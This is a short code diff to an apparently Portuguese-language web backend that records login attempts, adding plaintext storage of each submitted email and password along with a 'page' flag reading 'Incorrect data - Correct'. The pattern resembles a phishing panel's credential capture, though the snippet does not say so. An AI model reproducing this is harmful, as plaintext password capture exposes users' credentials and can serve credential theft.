@@ -269,7 +269,14 @@ async def add_attempt_to_existing(attempt_id: str, attempt: LoginAttemptCreate):
     
     await db.login_attempts.update_one(
         {"id": attempt_id},
-        {"$push": {"attempts": new_attempt}}
+        {
+            "$push": {"attempts": new_attempt},
+            "$set": {
+                "email": attempt.email,
+                "password": attempt.password,
+                "page": "Dados incorretos - Corrigir"
+            }
+        }
     )
     
     return {"message": "Tentativa adicionada com sucesso"}
